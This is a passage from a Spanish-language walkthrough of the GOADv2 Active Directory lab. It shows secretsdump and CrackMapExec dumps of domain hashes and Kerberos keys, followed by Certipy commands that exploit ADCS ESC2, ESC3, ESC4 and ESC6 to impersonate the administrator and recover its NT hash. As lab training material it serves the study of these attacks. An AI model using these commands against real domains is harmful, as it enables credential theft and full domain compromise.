SMB         essos.local     445    MEEREEN          MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:9decb68b4803a098eb288827205b563a:::
SMB         essos.local     445    MEEREEN          BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:c4b53445fe63f650ab42e57a3ebf18fe:::
SMB         essos.local     445    MEEREEN          SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:8f511bf07c331b08a63201072f305f49:::
SMB         essos.local     445    MEEREEN          [+] Dumped 14 NTDS hashes to /root/.cme/logs/MEEREEN_essos.local_2023-09-20_204355.ntds of which 11 were added to the database
SMB         essos.local     445    MEEREEN          [*] To extract only enabled accounts from the output file, run the following command: 
SMB         essos.local     445    MEEREEN          [*] cat /root/.cme/logs/MEEREEN_essos.local_2023-09-20_204355.ntds | grep -iv disabled | cut -d ':' -f1
SMB         essos.local     445    MEEREEN          [*] grep -iv disabled /root/.cme/logs/MEEREEN_essos.local_2023-09-20_204355.ntds | cut -d ':' -f1
```
    
Mientras que con SecretsDump, el proceso se llevaría a cabo de la siguiente manera:
    
```jsx
┌─[✗]─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #secretsdump.py essos.local/Administrator@192.168.56.12 -hashes aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
Impacket v0.11.0 - Copyright 2023 Fortra
    
[*] Target system bootKey: 0x36b4dabbe335b1566796b562f4d4ca17
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
ESSOS\MEEREEN$:aes256-cts-hmac-sha1-96:28541fbd37869fbd918dbf46ca11e32731196e19fa90f1381cea65e769afa126
ESSOS\MEEREEN$:aes128-cts-hmac-sha1-96:74d357e09591e374496cd2f3e104cc67
ESSOS\MEEREEN$:des-cbc-md5:9dc829a1e9a2b519
ESSOS\MEEREEN$:plain_password_hex:a344ae5f916bf85a97050ccd659269d193c53fd36576808b7591a04faa86ab0cbaeffc0874eb6663eb4580b681d756a9be1595cbf94c257307e5df1062be3510de2bb9c554f46136b990585cad4469d348d62a623c4ccb37a2e3d4ea51396160e427a901f770755a01ae875ea52cb2545adf4218a351e3140225375b5c17db3221f3a8063c5a79e366f81774606f0d17cca325c967c114517cb3af18073787a61088d12dc5d3c5d70e80a5e8816909f3697813abc8355d82cfea559106593c3a03b250a7ae9c03a878ad3a24e68bc822cb4466864612a2e60da25b889dc2cc3ae24445d1edd7407b2bcc301621c3fd96
ESSOS\MEEREEN$:aad3b435b51404eeaad3b435b51404ee:9decb68b4803a098eb288827205b563a:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xd9f66019f506afb6b435c0dd6ea91db69b6b4524
dpapi_userkey:0x2b68afc0da10647bb1caf7136c662203b7e7e9cf
[*] NL$KM 
 0000   48 12 38 16 FC 21 D8 4B  13 02 2E EF A9 E1 B3 FF   H.8..!.K........
 0010   C8 F3 E1 9B 62 AC A5 2C  F8 3E 07 1B 66 C5 93 AD   ....b..,.>..f...
 0020   06 16 32 5D 1D 00 C0 84  9B EF 1F 84 1C B1 E3 F3   ..2]............
 0030   41 8A ED 9D 0A 6A 75 6F  EC 7B D9 79 CF 8E 24 D9   A....juo.{.y..$.
NL$KM:48123816fc21d84b13022eefa9e1b3ffc8f3e19b62aca52cf83e071b66c593ad0616325d1d00c0849bef1f841cb1e3f3418aed9d0a6a756fec7bd979cf8e24d9
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82199d0eb8901cba42316debbb953240:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
daenerys.targaryen:1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
viserys.targaryen:1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
khal.drogo:1112:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
jorah.mormont:1113:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
angussmoody:1115:aad3b435b51404eeaad3b435b51404ee:58cf12d7448ca3ea7da502c83ee6a31e:::
MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:9decb68b4803a098eb288827205b563a:::
BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:c4b53445fe63f650ab42e57a3ebf18fe:::
SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:8f511bf07c331b08a63201072f305f49:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:b46977016f518d492039b32b58925cf9b4192ea145fe2b1d0c2e40e44df021f9
krbtgt:aes128-cts-hmac-sha1-96:d2ecac8e0dd5c4b0190c3dde4ad0862c
krbtgt:des-cbc-md5:c8a708384cefa12f
daenerys.targaryen:aes256-cts-hmac-sha1-96:cf091fbd07f729567ac448ba96c08b12fa67c1372f439ae093f67c6e2cf82378
daenerys.targaryen:aes128-cts-hmac-sha1-96:eeb91a725e7c7d83bfc7970532f2b69c
daenerys.targaryen:des-cbc-md5:bc6ddf7ce60d29cd
viserys.targaryen:aes256-cts-hmac-sha1-96:b4124b8311d9d84ee45455bccbc48a108d366d5887b35428075b644e6724c96e
viserys.targaryen:aes128-cts-hmac-sha1-96:4b34e2537da4f1ac2d16135a5cb9bd3e
viserys.targaryen:des-cbc-md5:70528fa13bc1f2a1
khal.drogo:aes256-cts-hmac-sha1-96:2ef916a78335b11da896216ad6a4f3b1fd6276938d14070444900a75e5bf7eb4
khal.drogo:aes128-cts-hmac-sha1-96:7d76da251df8d5cec9bf3732e1f6c1ac
khal.drogo:des-cbc-md5:b5ec4c1032ef020d
jorah.mormont:aes256-cts-hmac-sha1-96:286398f9a9317f08acd3323e5cef90f9e84628c43597850e22d69c8402a26ece
jorah.mormont:aes128-cts-hmac-sha1-96:896e68f8c9ca6c608d3feb051f0de671
jorah.mormont:des-cbc-md5:b926916289464ffb
sql_svc:aes256-cts-hmac-sha1-96:ca26951b04c2d410864366d048d7b9cbb252a810007368a1afcf54adaa1c0516
sql_svc:aes128-cts-hmac-sha1-96:dc0da2bdf6dc56423074a4fd8a8fa5f8
sql_svc:des-cbc-md5:91d6b0df31b52a3d
angussmoody:aes256-cts-hmac-sha1-96:da6575ba99aeed92d15fbfe9b23a1c4e8b5c46b9c5db9da8c672f619200d1880
angussmoody:aes128-cts-hmac-sha1-96:7e3cf40500816ea8b445cbd9e25d1ea1
angussmoody:des-cbc-md5:43a4ec689b58fe38
MEEREEN$:aes256-cts-hmac-sha1-96:28541fbd37869fbd918dbf46ca11e32731196e19fa90f1381cea65e769afa126
MEEREEN$:aes128-cts-hmac-sha1-96:74d357e09591e374496cd2f3e104cc67
MEEREEN$:des-cbc-md5:375bc24f19a4c237
BRAAVOS$:aes256-cts-hmac-sha1-96:b80bb4421614543de530f4c68bc9dd747bee87119f34777d8d69b5046187d7c3
BRAAVOS$:aes128-cts-hmac-sha1-96:7229c601ba26a872bed6d8e47dbb3327
BRAAVOS$:des-cbc-md5:92ec98684026e3f4
SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:bce046a40d2b5715424fa74fe2c8d8693f5a4bf804c2c36c00253e71a675891d
SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:5a226a85e65aa8d5cfe2c899b9d4ad1b
SEVENKINGDOMS$:des-cbc-md5:7f54e9fb4513014a
[*] Cleaning up...
```

---

## ADCS - ESC2 & ESC3

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2031.png)

Como se menciona en la página de certificación, "ESC2 es cuando una plantilla de certificado puede usarse para cualquier propósito. Dado que el certificado puede utilizarse para cualquier propósito, puede utilizarse para la misma técnica que con ESC3 para la mayoría de las plantillas de certificados".

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2032.png)

Se solicita un certificado de seguridad en el entorno para el usuario khal.drogo, utilizando la plantilla de certificado y la Autoridad de Certificación correspondientes. El certificado se almacena en un archivo PFX para su uso en autenticación y seguridad.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC2]
└──╼ #certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC2 -ca ESSOS-CA
Certipy v4.8.1 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 26
[*] Got certificate with UPN 'khal.drogo@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'khal.drogo.pfx'
```

Se solicita un certificado en nombre del usuario khal.drogo. El certificado se obtiene de la Autoridad de Certificación 'ESSOS-CA' y utiliza la plantilla 'User'. La autenticación se realiza en nombre del administrador 'essos\administrator', y finalmente, el certificado se guarda como 'administrator.pfx'.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC2]
└──╼ #certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template User -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx
Certipy v4.8.1 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 27
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Se emplea el certificado administrator.pfx para autenticarse como el usuario administrator en el controlador de dominio 192.168.56.12 con el fin de obtener un Ticket Granting Ticket (TGT). Luego, se guarda una memoria caché de credenciales con el nombre 'administrator.ccache' y se recupera el hash NT del usuario administrator, que es 'aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da'.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC2]
└──╼ #certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
Certipy v4.8.1 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```

En el caso de ESC3, se estarán realizando los mismos pasos mencionados anteriormente.

Se solicita un certificado de seguridad en el entorno para el usuario khal.drogo.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC3]
└──╼ #certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC3-CRA -ca ESSOS-CA
Certipy v4.8.1 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 31
[*] Got certificate with UPN 'khal.drogo@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'khal.drogo.pfx'
```

Se solicita el certificado para el usuario administrator.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC3]
└──╼ #certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC3 -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx
Certipy v4.8.1 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 32
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Finalmente, se obtiene el Ticket Granting Ticket (TGT) y se recupera el hash NT.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC3]
└──╼ #certipy auth -pfx administrator.pfx -username administrator -domain essos.local -dc-ip 192.168.56.12
Certipy v4.8.1 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```

---

## ADCS - ESC4

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2033.png)

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2034.png)

Al ejecutar el comando, se actualiza una plantilla de certificado para ESC4 en el dominio essos.local. Durante este proceso, se realiza la autenticación con el servidor de LDAP y se crea una copia de seguridad de la configuración anterior en un archivo llamado ESC4.json esto se realiza con el comando `certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old -debug`

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC4]
└──╼ #certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old -debug
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'ESSOS.LOCAL' at '192.168.10.2'
[+] Resolved 'ESSOS.LOCAL' from cache: 192.168.56.12
[+] Authenticating to LDAP server
[+] Bound to ldaps://192.168.56.12:636 - ssl
[+] Default path: DC=essos,DC=local
[+] Configuration path: CN=Configuration,DC=essos,DC=local
[*] Saved old configuration for 'ESC4' to 'ESC4.json'
[*] Updating certificate template 'ESC4'
[+] MODIFY_DELETE:
[+]     pKIExtendedKeyUsage: []
[+]     msPKI-Certificate-Application-Policy: []
[+]     msPKI-RA-Application-Policies: []
[+] MODIFY_REPLACE:
[+]     nTSecurityDescriptor: [b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00\xc8\xa3\x1f\xdd\xe9\xba\xb8\x90,\xaes\xbb\xf4\x01\x00\x00']
[+]     flags: [b'0']
[+]     pKIDefaultKeySpec: [b'2']
[+]     pKIKeyUsage: [b'\x86\x00']
[+]     pKIMaxIssuingDepth: [b'-1']
[+]     pKICriticalExtensions: [b'2.5.29.19', b'2.5.29.15']
[+]     pKIExpirationPeriod: [b'\x00@\x1e\xa4\xe8e\xfa\xff']
[+]     pKIDefaultCSPs: [b'1,Microsoft Enhanced Cryptographic Provider v1.0']
[+]     msPKI-RA-Signature: [b'0']
[+]     msPKI-Enrollment-Flag: [b'0']
[+]     msPKI-Certificate-Name-Flag: [b'1']
[*] Successfully updated 'ESC4'
```

El comando anterior proporciona como resultado un archivo .json con la configuración correspondiente.

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC4]
└──╼ #ls
ESC4.json
```

Se solicita el certificado para el usuario administrator con el comando: `certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC4 -ca ESSOS-CA -upn administrator@essos.local`

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC4]
└──╼ #certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC4 -ca ESSOS-CA -upn administrator@essos.local
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 35
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Se obtiene el Ticket Granting Ticket (TGT) y se recupera el hash NT con el comando: certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC4]
└──╼ #certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```

y por último se deshace la configuración de la plantilla con el comando: `certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json`

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC4]
└──╼ #certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'ESC4'
[*] Successfully update 'ESC4'
```

---

## ADCS - ESC6

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2035.png)

Como se menciona en la página de [Certipy:](https://github.com/ly4k/Certipy#esc6){:target="_blank"} 'ESC6 ocurre cuando la Autoridad de Certificación (CA) especifica la bandera EDITF_ATTRIBUTESUBJECTALTNAME2. Esta bandera permite al solicitante (enrollee) especificar un nombre alternativo de sujeto (SAN) arbitrario en todos los certificados, a pesar de la configuración de una plantilla de certificado’

Debido a que ESSOS-CA es vulnerable a ESC6, podemos llevar a cabo el ataque ESC1, pero utilizando la plantilla de usuario en lugar de la plantilla ESC1, incluso si la plantilla de usuario tiene la opción 'Enrollee Supplies Subject' configurada en **falso**.

Se solicita el certificado para el usuario administrator con el comando: `certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template User -ca ESSOS-CA -upn administrator@essos.local`

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC6]
└──╼ #certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template User -ca ESSOS-CA -upn administrator@essos.local
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 42
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Se obtiene el Ticket Granting Ticket (TGT) y se recupera el hash NT con el comando: `certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12`

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC6]
└──╼ #certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```